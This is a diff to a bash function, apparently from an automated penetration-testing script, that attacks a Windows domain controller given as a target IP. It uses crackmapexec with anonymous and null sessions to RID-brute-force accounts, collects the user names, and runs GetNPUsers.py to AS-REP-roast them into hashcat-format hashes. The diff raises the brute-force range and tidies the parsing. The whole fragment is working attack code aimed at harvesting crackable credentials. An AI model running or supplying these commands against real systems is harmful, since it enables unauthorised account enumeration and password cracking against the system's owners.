@@ -129,14 +129,14 @@ smbFunc()
             smbPort=$(cat initial.txt | sed -r 's/\s+//g' | grep -m 2 "Sambasmbd" | tail -n 1 | awk '{print $1}' | cut -d "/" -f 1)
         fi
         if [[ $3 -gt 0 ]]; then
+            mkdir -p "$currentDirectory/smbResults"
             crackmapexec smb ${args[0]} --server-port $smbPort | tee "$currentDirectory/smbResults/WindowsOSVersion.txt"
-            crackmapexec smb ${args[0]} -u 'anonymous' -p '' --server-port $smbPort --rid-brute 10000 | tee "$currentDirectory/smbResults/RidBruteAllAnonymous.txt"
-            crackmapexec smb ${args[0]} -u '' -p '' --server-port $smbPort --rid-brute 10000 | tee "$currentDirectory/smbResults/RidBruteAllNull.txt"
-            crackmapexec smb ${args[0]} -u 'anonymous' -p '' --server-port $smbPort --rid-brute 10000 | grep '(SidTypeUser)' | tee "$currentDirectory/smbResults/RidBruteUsersAnonymous.txt"
-            if grep -q "SidTypeUser" "$currentDirectory/smbResults/RidBruteUsersAnonymous.txt"; then 
-                cat "$currentDirectory/smbResults/RidBruteUsersAnonymous.txt" | awk -F '\' '{print $NF}' | awk '{print $1}' | tee "$currentDirectory/smbResults/domainUsers.txt"
-                domainName=$(cat $currentDirectory/ldapResults/ldapInitial.txt | sed -n '/defaultNamingContext:/Ip' | sed 's/[^ ]* //' | sed 's/DC=//g' | sed 's/,/./g')
-                GetNPUsers.py $domainName/ -usersfile "$currentDirectory/smbResults/domainUsers.txt" -dc-ip ${args[0]} -format hashcat -outputfile "$currentDirectory/smbResults/asRepHashes.txt" | grep -F -e '[+]' -e '[-]'
+            crackmapexec smb ${args[0]} -u 'anonymous' -p '' --server-port $smbPort --rid-brute 20000 | tee "$currentDirectory/smbResults/RidBruteAllAnonymous.txt"
+            crackmapexec smb ${args[0]} -u '' -p '' --server-port $smbPort --rid-brute 20000 | tee "$currentDirectory/smbResults/RidBruteAllNull.txt"
+            cat "$currentDirectory/smbResults/RidBruteAllAnonymous.txt" | grep '(SidTypeUser)' | awk -F'\\\\' '{print $NF}' | awk '{print $1}' | tee "$currentDirectory/smbResults/domainUsers.txt"
+            if [[ -s "$currentDirectory/smbResults/domainUsers.txt" ]]; then
+                domainName=$(sed -n '/defaultNamingContext:/Ip' "$currentDirectory/ldapResults/ldapInitial.txt" | sed 's/[^ ]* //' | sed 's/DC=//g' | sed 's/,/./g')
+                GetNPUsers.py "$domainName/" -usersfile "$currentDirectory/smbResults/domainUsers.txt" -dc-ip ${args[0]} -format hashcat -outputfile "$currentDirectory/smbResults/asRepHashes.txt" | grep -F -e '[+]' -e '[-]'
             fi
         fi
 
